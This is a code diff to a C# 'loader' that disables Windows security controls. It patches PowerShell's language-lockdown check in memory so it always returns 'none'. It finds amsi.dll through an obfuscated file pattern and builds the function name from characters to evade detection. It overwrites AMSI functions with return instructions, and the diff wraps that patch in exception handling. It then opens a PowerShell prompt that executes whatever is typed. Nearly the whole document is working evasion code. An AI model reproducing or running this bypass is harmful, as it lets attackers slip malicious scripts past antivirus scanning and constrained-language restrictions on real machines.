@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Runtime.CompilerServices;
+using System.Runtime.ExceptionServices;
 using System.IO;
 
 namespace loader
@@ -17,12 +18,12 @@ namespace loader
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
 
-        public static void Main()
+        [HandleProcessCorruptedStateExceptions]public static void Main()
         {
             go();
         }
 
-        public static void go()
+        [HandleProcessCorruptedStateExceptions]public static void go()
         {
             // Find a reference to the automation assembly
             var Automation = typeof(System.Management.Automation.Alignment).Assembly;
@@ -43,24 +44,31 @@ namespace loader
             // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
             var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
             Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
-
             string[] filePaths = Directory.GetFiles(@"c:\windows\system32", "a?s?.d*");
             string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
+            try
+            {
+                var lib = LoadLibrary(libname);
+                Char c1, c2, c3, c4, c5;
+                c1 = 'A';
+                c2 = 's';
+                c3 = 'c';
+                c4 = 'n';
+                c5 = 'l';
+                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "iUa" + c3 + "I" + c4 + "itia" + c5 + "ize");
+                Console.WriteLine(baseaddr);
+                var funcaddr = baseaddr - 96;
+                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
+                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
+                funcaddr = baseaddr - 352;
+                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
+                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
+            }
+            catch
+            {
+                Console.WriteLine("Couldn't patch " + libname + "...");
+            }
 
-            var lib = LoadLibrary(libname);
-            Char c1, c2, c3, c4, c5;
-            c1 = 'A';
-            c2 = 's';
-            c3 = 'c';
-            c4 = 'n';
-            c5 = 'l';
-            var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "iUa" + c3 + "I" + c4 + "itia" + c5 + "ize");
-            var funcaddr = baseaddr - 96;
-            VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
-            Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
-            funcaddr = baseaddr - 352;
-            VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
-            Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
 
             string[] cmd = new string[] { "while ($true){$cmd = Read-Host -Prompt \"PS>\"; if ($cmd -Contains \"exit\") { break} else { iex $cmd; \"`n\"}}" };
             while (true)
